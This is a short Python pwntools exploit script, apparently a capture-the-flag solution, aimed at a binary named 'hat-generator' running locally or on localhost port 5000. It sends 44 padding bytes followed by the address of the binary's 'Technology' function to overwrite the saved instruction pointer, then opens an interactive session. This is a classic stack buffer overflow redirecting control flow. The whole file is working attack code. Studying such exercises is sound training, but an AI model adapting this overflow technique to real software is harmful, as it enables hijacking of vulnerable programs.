from pwn import *

elf = ELF('./hat-generator')

remote_host = 'localhost'
remote_port = 5000

def start():
    if args.LOCAL:
        return elf.process()
    if args.REMOTE:
        return remote(remote_host, remote_port)
    exit()

eip_off = 44
technology_addr = elf.symbols['Technology']

io = start()
payload = flat([
    "A"*eip_off,
    p32(technology_addr)
])
io.sendline(payload)
io.interactive()